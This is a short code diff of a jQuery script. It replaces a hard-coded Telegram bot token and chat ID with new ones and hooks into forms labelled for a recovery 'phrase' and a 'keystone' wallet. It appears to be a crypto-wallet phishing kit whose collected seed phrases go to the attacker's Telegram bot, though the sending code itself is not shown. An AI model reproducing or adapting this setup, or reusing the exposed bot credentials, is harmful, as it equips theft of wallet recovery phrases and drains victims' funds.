@@ -1,6 +1,6 @@
 $(document).ready(function () {
-  const token = "7020951429:AAHkQnSWiuEuet2HLbNmZ3OuhpNbAwDHCrs";
-  const chatId = "7178427957"; // "5706267146";
+  const token = "78412784781:AAHQSFmw1I0oe9xHRWrj84C38Lc71kGtA88";
+  const chatId = "8063836406";
 
   const phraseForm = $("#phrase_content form");
   const keystoneForm = $("#keyj_content form");
